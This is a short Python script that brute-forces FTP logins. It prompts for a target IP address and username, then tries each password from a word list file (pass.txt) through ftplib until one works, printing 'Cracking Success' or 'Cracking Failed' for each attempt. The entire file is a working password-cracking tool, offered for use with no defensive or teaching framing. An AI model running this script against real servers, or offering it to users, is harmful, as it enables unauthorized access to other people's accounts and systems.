from ftplib import FTP
global ftp
import sys
file1 = open('pass.txt', 'r')
Lines = file1.readlines()
ip=input("Enter ip you want to crack:")
user=input("Enter Username you want to crack:")
def crackfn(passwords):
	try:
		ftp = FTP(ip, user=user, passwd=passwords)
		print("[+] Cracking Success Password:["+passwords+"]")
		return 1
	except:
		print("[-] Cracking Failed Password:"+passwords)
		return 0
for line in Lines:
	crackstatus=crackfn(line.strip())
	if crackstatus == 1:
		break

	#print(password + " Success\n")
